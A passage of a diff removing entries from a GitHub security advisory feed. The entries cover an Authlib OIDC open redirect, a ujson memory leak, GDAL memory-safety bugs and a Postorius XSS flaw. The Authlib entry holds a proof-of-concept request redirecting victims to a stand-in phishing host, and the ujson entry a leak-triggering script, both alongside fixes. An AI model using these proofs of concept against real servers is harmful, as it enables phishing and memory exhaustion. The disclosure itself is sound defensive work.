-<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-r95x-qfjj-fjj2">https://github.com/authlib/authlib/security/advisories/GHSA-r95x-qfjj-fjj2</a></li>
-<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.12">https://github.com/authlib/authlib/releases/tag/v1.6.12</a></li>
-<li><a href="https://github.com/authlib/authlib/releases/tag/v1.7.1">https://github.com/authlib/authlib/releases/tag/v1.7.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-r95x-qfjj-fjj2">https://github.com/advisories/GHSA-r95x-qfjj-fjj2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r95x-qfjj-fjj2</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-13T01:36:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[authlib] Authlib OIDC Implicit/Hybrid Authorization Vulnerable to Open Redirect]]></title>
-        <id>https://github.com/advisories/GHSA-r95x-qfjj-fjj2</id>
-        <link href="https://github.com/advisories/GHSA-r95x-qfjj-fjj2"/>
-        <updated>2026-05-13T01:36:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An unauthenticated open redirect in Authlib's <code>OpenIDImplicitGrant</code> and <code>OpenIDHybridGrant</code> authorization endpoint lets a remote attacker cause the authorization server to issue an HTTP 302 to an attacker-chosen URL by submitting an authorization request that omits the <code>openid</code> scope.</p>
-<h3 id="details">Details</h3>
-<h4 id="vulnerable-code">Vulnerable code</h4>
-<p><code>OpenIDImplicitGrant.validate_authorization_request</code> in <code>authlib/oidc/core/grants/implicit.py</code>:</p>
-<pre><code class="language-python">def validate_authorization_request(self):
-    if not is_openid_scope(self.request.payload.scope):
-        raise InvalidScopeError(
-            "Missing 'openid' scope",
-            redirect_uri=self.request.payload.redirect_uri,  # ← raw, unvalidated
-            redirect_fragment=True,
-        )
-    redirect_uri = super().validate_authorization_request()
-    ...
-</code></pre>
-<p><code>OpenIDHybridGrant.validate_authorization_request</code> in <code>authlib/oidc/core/grants/hybrid.py</code> shares the same pattern.</p>
-<h4 id="root-cause">Root cause</h4>
-<p>Both methods perform the <code>openid</code> scope presence check before delegating to <code>super().validate_authorization_request()</code>, which is where <code>AuthorizationEndpointMixin.validate_authorization_redirect_uri</code> validates the requested <code>redirect_uri</code> against the client's <code>check_redirect_uri(...)</code>. The <code>InvalidScopeError</code> thrown by the scope check therefore carries attacker-controlled <code>self.request.payload.redirect_uri</code>.</p>
-<p><code>OAuth2Error.__call__</code> in <code>authlib/oauth2/base.py</code> renders any error with a non-empty <code>redirect_uri</code> as an HTTP 302:</p>
-<pre><code class="language-python">def __call__(self, uri=None):
-    if self.redirect_uri:
-        params = self.get_body()
-        loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)
-        return 302, "", [("Location", loc)]
-    return super().__call__(uri=uri)
-</code></pre>
-<p>A malformed authorization request that selects <code>OpenIDImplicitGrant</code> or <code>OpenIDHybridGrant</code> and omits the <code>openid</code> scope is therefore redirected to a fully attacker-chosen URL.</p>
-<p>This is a variant of the issue fixed in commit <a href="https://github.com/authlib/authlib/commit/3be08468"><code>3be08468</code></a> ("fix: redirecting to unvalidated <code>redirect_uri</code> on <code>UnsupportedResponseTypeError</code>") that was missed in the OIDC Implicit and Hybrid grants.</p>
-<h4 id="preconditions">Preconditions</h4>
-<ol>
-<li>The server registers <code>OpenIDImplicitGrant</code> or <code>OpenIDHybridGrant</code> (standard OIDC Implicit or Hybrid flow support).</li>
-<li>The attacker's request uses a <code>response_type</code> that matches either grant: <code>id_token</code>, <code>id_token token</code>, <code>code id_token</code>, <code>code token</code>, or <code>code id_token token</code>.</li>
-<li><code>scope</code> does not contain <code>openid</code>.</li>
-<li>Any <code>redirect_uri</code> value.</li>
-</ol>
-<p>No user authentication, no consent, no valid session, no CSRF token, and — notably — no valid <code>client_id</code> are required. The scope check runs before any client lookup, so any <code>client_id</code> value (including nonexistent ones) reaches the vulnerable code path.</p>
-<h3 id="poc">PoC</h3>
-<p>The following unauthenticated GET is sufficient to induce the authorization server to redirect a victim's browser to an attacker-controlled URL:</p>
-<pre><code>GET /oauth/authorize
-    ?response_type=id_token
-    &amp;client_id=anything
-    &amp;scope=profile
-    &amp;redirect_uri=https%3A%2F%2Fevil.example.com%2Fphish
-    &amp;state=s&amp;nonce=n  HTTP/1.1
-Host: victim-op.example
-</code></pre>
-<p>Server response:</p>
-<pre><code>HTTP/1.1 302 Found
-Location: https://evil.example.com/phish#error=invalid_scope&amp;error_description=Missing+%27openid%27+scope&amp;state=s
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Open redirect from a trusted authorization server origin. Victims receiving a phishing link see the legitimate OIDC provider's domain in the URL bar at the moment they click. The authorization server itself issues the 302 to the attacker's page, lending the attacker's landing page the OP's reputation and potentially satisfying domain-allow-list controls that trust the OP.</li>
-<li>Phishing / credential harvesting leverage. The attacker's page can mimic the legitimate OP's consent screen or a relying-party error page to solicit credentials, MFA codes, or to continue a downstream confused-deputy attack.</li>
-<li>RFC violation. RFC 6749 §4.1.2.1 and RFC 9700 (OAuth 2.0 Security BCP) §4.11 both state that an authorization server MUST NOT perform redirection to a <code>redirect_uri</code> that has not been validated against the client's registered URIs, even in error responses. The <code>state</code> parameter is echoed back, giving the attacker site a stable correlator.</li>
-<li>No direct token/code leak. This flaw fires before any authorization decision, so no authorization codes, ID tokens, or access tokens are disclosed. The impact is limited to open-redirect phishing leverage. Combined with other issues (e.g., downstream SSO trust chains) it may contribute to account-takeover chains; on its own it is a Medium-severity open redirect.</li>
-</ul>
-<h4 id="affected-deployments">Affected deployments</h4>
-<p>Any application using Authlib as an OIDC provider that registers <code>OpenIDImplicitGrant</code> and/or <code>OpenIDHybridGrant</code> — i.e. anyone supporting the Implicit flow or the Hybrid flow (<code>response_type=code id_token</code>, etc.) — is affected. Clients of an Authlib-based OP are not directly affected; this is a server-side issue.</p>
-<p>Authorization servers that only register the plain <code>AuthorizationCodeGrant</code> (code flow, with or without PKCE and the <code>OpenIDCode</code> extension) are not affected by this specific variant: the code-flow grant validates <code>redirect_uri</code> before raising scope errors. If you were affected by the sibling issue fixed in <code>3be08468</code> (<code>UnsupportedResponseTypeError</code>), you should already be on <code>1.6.10</code> or later; this advisory is independent of that fix.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>The attached <code>fix-oidc-open-redirect.patch</code> reorders each method to delegate to its super (or call <code>validate_code_authorization_request</code> for Hybrid) first, and then performs the <code>openid</code>-scope check with the validated <code>redirect_uri</code> variable.</p>
-<pre><code class="language-python"># authlib/oidc/core/grants/implicit.py
-def validate_authorization_request(self):
-    redirect_uri = super().validate_authorization_request()   # runs client + redirect_uri validation
-    if not is_openid_scope(self.request.payload.scope):
-        raise InvalidScopeError(
-            "Missing 'openid' scope",
-            redirect_uri=redirect_uri,                         # validated
-            redirect_fragment=True,
-        )
-    try:
-        validate_nonce(self.request, self.exists_nonce, required=True)
-    except OAuth2Error as error:
-        error.redirect_uri = redirect_uri
-        error.redirect_fragment = True
-        raise error
-    return redirect_uri
-</code></pre>
-<p>An equivalent transform is applied to <code>OpenIDHybridGrant.validate_authorization_request</code>, invoking <code>validate_code_authorization_request</code> first and only then checking <code>is_openid_scope</code>.</p>
-<p>Alternatively, inline a <code>client = query_client(request.payload.client_id)</code> + <code>client.check_redirect_uri(request.payload.redirect_uri)</code> guard before populating <code>redirect_uri</code> on the error — the pattern used in <code>3be08468</code>.</p>
-<p>The patch also adds regression tests analogous to <code>test_unsupported_response_type_does_not_redirect</code> from commit <code>3be08468</code>, asserting <code>rv.status_code == 400</code> and <code>rv.headers.get("Location") is None</code> for an unregistered <code>redirect_uri</code> with a non-<code>openid</code> scope.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No clean server-side workaround exists short of patching. Partial mitigations:</p>
-<ul>
-<li>Unregister <code>OpenIDImplicitGrant</code> and <code>OpenIDHybridGrant</code> if the Implicit and Hybrid flows are not required. (RFC 9700 deprecates the Implicit flow and discourages Hybrid flows, so this is recommended anyway.)</li>
-<li>Front the <code>/authorize</code> endpoint with a reverse proxy rule that rejects requests containing both a <code>redirect_uri</code> parameter and a <code>scope</code> that does not include <code>openid</code> when <code>response_type</code> matches the vulnerable set. This is fragile and not recommended as a primary control.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li>RFC 6749, §4.1.2.1 — Error Response (OAuth 2.0 authorization endpoint)</li>
-<li>RFC 9700, §4.11 — Redirect URI validation</li>
-<li>OpenID Connect Core 1.0, §3.2.2.6 / §3.3.2.6 — Authentication Error Response</li>
-<li>Authlib commit <a href="https://github.com/authlib/authlib/commit/3be08468"><code>3be08468</code></a> — prior fix for the same class of issue in <code>UnsupportedResponseTypeError</code> (Authlib 1.6.10)</li>
-<li>Authlib source (by symbol; verified in commit <code>5d2e603e</code>):<ul>
-<li><code>OpenIDImplicitGrant.validate_authorization_request</code> — <code>authlib/oidc/core/grants/implicit.py</code></li>
-<li><code>OpenIDHybridGrant.validate_authorization_request</code> — <code>authlib/oidc/core/grants/hybrid.py</code></li>
-<li><code>OAuth2Error.__call__</code> — <code>authlib/oauth2/base.py</code> (renders errors with <code>redirect_uri</code> as HTTP 302)</li>
-<li><code>AuthorizationEndpointMixin.validate_authorization_redirect_uri</code> — <code>authlib/oauth2/rfc6749/grants/base.py</code> (the validation that is bypassed)</li>
-</ul>
-</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-r95x-qfjj-fjj2">https://github.com/authlib/authlib/security/advisories/GHSA-r95x-qfjj-fjj2</a></li>
-<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.12">https://github.com/authlib/authlib/releases/tag/v1.6.12</a></li>
-<li><a href="https://github.com/authlib/authlib/releases/tag/v1.7.1">https://github.com/authlib/authlib/releases/tag/v1.7.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-r95x-qfjj-fjj2">https://github.com/advisories/GHSA-r95x-qfjj-fjj2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r95x-qfjj-fjj2</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-13T01:36:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ujson] UltraJSON has a Memory Leak in ujson.dump() on Write Failure]]></title>
-        <id>https://github.com/advisories/GHSA-c38f-wx89-p2xg</id>
-        <link href="https://github.com/advisories/GHSA-c38f-wx89-p2xg"/>
-        <updated>2026-05-12T22:25:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When <code>ujson.dump()</code> writes to a file-like object and the write operation raises an exception, the serialized JSON string object is not decremented, leaking memory. Each failed write operation leaks the full size of the serialized payload.</p>
-<p>Code that uses <code>ujson.dumps()</code> rather than <code>ujson.dump()</code> or only JSON load/decode methods is unaffected.</p>
-<h3 id="details">Details</h3>
-<p><strong>Vulnerability Location:</strong></p>
-<ul>
-<li><code>src/ujson/python/objToJSON.c:913</code> - <code>objToJSONFile()</code> function start</li>
-<li><code>src/ujson/python/objToJSON.c:931</code> - Error return on write failure</li>
-<li><code>src/ujson/python/objToJSON.c:942</code> - Early return without cleanup</li>
-</ul>
-<p><strong>Root Cause:</strong></p>
-<p>The <code>objToJSONFile()</code> function allocates a Python string object via <code>ujson_dumps_internal()</code>, calls the file's <code>write()</code> method, and returns early if <code>write()</code> raises an exception—but never calls <code>Py_DECREF(string)</code> on the early exit path.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-python">import gc, tracemalloc, ujson
-
-class BadFile:
-    def write(self, s):
-        raise RuntimeError("boom")
-
-obj = {"x": "A" * 200000}
-
-def run():
-    try:
-        ujson.dump(obj, BadFile())
-    except RuntimeError:
-        pass
-
-run()
-tracemalloc.start()
-gc.collect()
-base = tracemalloc.get_traced_memory()[0]
-
-for i in range(5):
-    run()
-    gc.collect()
-    cur = tracemalloc.get_traced_memory()[0]
-    print(i, cur - base)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Any application that serializes data through <code>ujson.dump()</code> to an attacker-influenced file-like object that can fail can be driven into linear memory growth. An attacker can quickly use up all the memory of say a web server that sends JSON responses using <code>ujson.dump()</code> by repeatedly making requests then closing the connection mid response.</p>
-<h3 id="remediation">Remediation</h3>
-<p>The missing dec-refs were added in 82af1d0ac01d09aa40c887b460d44b9d9f4bccd9. We recommend upgrading to <a href="https://github.com/ultrajson/ultrajson/releases/tag/5.12.1">UltraJSON 5.12.1</a>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Replacing <code>ujson.dump(obj, file)</code> with <code>file.write(ujson.dumps(obj))</code> is equivalent (contrary to popular misconception, there are no streaming benefits to using <code>ujson.dump()</code>) and will avoid the memory leak.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c38f-wx89-p2xg">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c38f-wx89-p2xg</a></li>
-<li><a href="https://github.com/ultrajson/ultrajson/commit/82af1d0ac01d09aa40c887b460d44b9d9f4bccd9">https://github.com/ultrajson/ultrajson/commit/82af1d0ac01d09aa40c887b460d44b9d9f4bccd9</a></li>
-<li><a href="https://github.com/ultrajson/ultrajson/releases/tag/5.12.1">https://github.com/ultrajson/ultrajson/releases/tag/5.12.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-c38f-wx89-p2xg">https://github.com/advisories/GHSA-c38f-wx89-p2xg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c38f-wx89-p2xg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-12T22:25:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GDAL] OSGeo GDAL vulnerable to out-of-bounds read]]></title>
-        <id>https://github.com/advisories/GHSA-j3f5-rw74-g4rv</id>
-        <link href="https://github.com/advisories/GHSA-j3f5-rw74-g4rv"/>
-        <updated>2026-05-12T16:29:30.000Z</updated>
-        <content type="html"><![CDATA[<p>A weakness has been identified in OSGeo gdal up to 3.13.0dev-4. The affected element is the function GDfieldinfo of the file frmts/hdf4/hdf-eos/GDapi.c. Executing a manipulation can lead to out-of-bounds read. The attack needs to be launched locally. The exploit has been made available to the public and could be used for attacks. Upgrading to version 3.13.0RC1 is sufficient to fix this issue. This patch is called a791f70f8eaec540974ec989ca6fb00266b7646c. The affected component should be upgraded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8088">https://nvd.nist.gov/vuln/detail/CVE-2026-8088</a></li>
-<li><a href="https://github.com/OSGeo/gdal/issues/14379">https://github.com/OSGeo/gdal/issues/14379</a></li>
-<li><a href="https://github.com/OSGeo/gdal/commit/a791f70f8eaec540974ec989ca6fb00266b7646c">https://github.com/OSGeo/gdal/commit/a791f70f8eaec540974ec989ca6fb00266b7646c</a></li>
-<li><a href="https://github.com/OSGeo/gdal">https://github.com/OSGeo/gdal</a></li>
-<li><a href="https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1">https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1</a></li>
-<li><a href="https://github.com/biniamf/pocs/tree/main/gdal-gdapi-gdfinfo-dimlist-oob-read">https://github.com/biniamf/pocs/tree/main/gdal-gdapi-gdfinfo-dimlist-oob-read</a></li>
-<li><a href="https://vuldb.com/submit/808040">https://vuldb.com/submit/808040</a></li>
-<li><a href="https://vuldb.com/vuln/361841">https://vuldb.com/vuln/361841</a></li>
-<li><a href="https://vuldb.com/vuln/361841/cti">https://vuldb.com/vuln/361841/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-j3f5-rw74-g4rv">https://github.com/advisories/GHSA-j3f5-rw74-g4rv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j3f5-rw74-g4rv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-07T21:30:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GDAL] OSGeo GDAL vulnerable to heap-based buffer overflow]]></title>
-        <id>https://github.com/advisories/GHSA-h9rh-5ffh-h669</id>
-        <link href="https://github.com/advisories/GHSA-h9rh-5ffh-h669"/>
-        <updated>2026-05-12T16:29:15.000Z</updated>
-        <content type="html"><![CDATA[<p>A security flaw has been discovered in OSGeo gdal up to 3.13.0dev-4. Impacted is the function GDnentries of the file frmts/hdf4/hdf-eos/GDapi.c. Performing a manipulation of the argument DataFieldName results in heap-based buffer overflow. The attack must be initiated from a local position. The exploit has been released to the public and may be used for attacks. Upgrading to version 3.13.0RC1 is recommended to address this issue. The patch is named 184f77dbcc74118c062c05e464c88161d3c37b9b. You should upgrade the affected component.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8087">https://nvd.nist.gov/vuln/detail/CVE-2026-8087</a></li>
-<li><a href="https://github.com/OSGeo/gdal/issues/14363">https://github.com/OSGeo/gdal/issues/14363</a></li>
-<li><a href="https://github.com/OSGeo/gdal/commit/184f77dbcc74118c062c05e464c88161d3c37b9b">https://github.com/OSGeo/gdal/commit/184f77dbcc74118c062c05e464c88161d3c37b9b</a></li>
-<li><a href="https://github.com/OSGeo/gdal">https://github.com/OSGeo/gdal</a></li>
-<li><a href="https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1">https://github.com/OSGeo/gdal/releases/tag/v3.13.0RC1</a></li>
-<li><a href="https://github.com/biniamf/pocs/tree/main/gdal-gdinqfields_bof">https://github.com/biniamf/pocs/tree/main/gdal-gdinqfields_bof</a></li>
-<li><a href="https://vuldb.com/submit/808039">https://vuldb.com/submit/808039</a></li>
-<li><a href="https://vuldb.com/vuln/361840">https://vuldb.com/vuln/361840</a></li>
-<li><a href="https://vuldb.com/vuln/361840/cti">https://vuldb.com/vuln/361840/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-h9rh-5ffh-h669">https://github.com/advisories/GHSA-h9rh-5ffh-h669</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h9rh-5ffh-h669</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-07T21:30:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[postorius] Postorius is vulnerable to XSS]]></title>
-        <id>https://github.com/advisories/GHSA-r7c9-7pjq-hmm8</id>
-        <link href="https://github.com/advisories/GHSA-r7c9-7pjq-hmm8"/>
-        <updated>2026-05-12T16:20:38.000Z</updated>
-        <content type="html"><![CDATA[<p>Postorius through 1.3.13 does not escape HTML in the message subject when rendering it in the Held messages pop-up, as exploited in the wild in May 2026.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44742">https://nvd.nist.gov/vuln/detail/CVE-2026-44742</a></li>
-<li><a href="https://gitlab.com/mailman/postorius/-/commit/c4706abd05ba6bcf472fc674b160d3a9d6a4868b">https://gitlab.com/mailman/postorius/-/commit/c4706abd05ba6bcf472fc674b160d3a9d6a4868b</a></li>
-<li><a href="https://gitlab.com/mailman/postorius/-/issues/620">https://gitlab.com/mailman/postorius/-/issues/620</a></li>
-<li><a href="https://gitlab.com/mailman/postorius/-/merge_requests/972">https://gitlab.com/mailman/postorius/-/merge_requests/972</a></li>
-<li><a href="https://www.openwall.com/lists/oss-security/2026/05/07/3">https://www.openwall.com/lists/oss-security/2026/05/07/3</a></li>
-<li><a href="https://github.com/advisories/GHSA-r7c9-7pjq-hmm8">https://github.com/advisories/GHSA-r7c9-7pjq-hmm8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r7c9-7pjq-hmm8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-07T21:30:29.000Z</published>
     </entry>
 </feed>
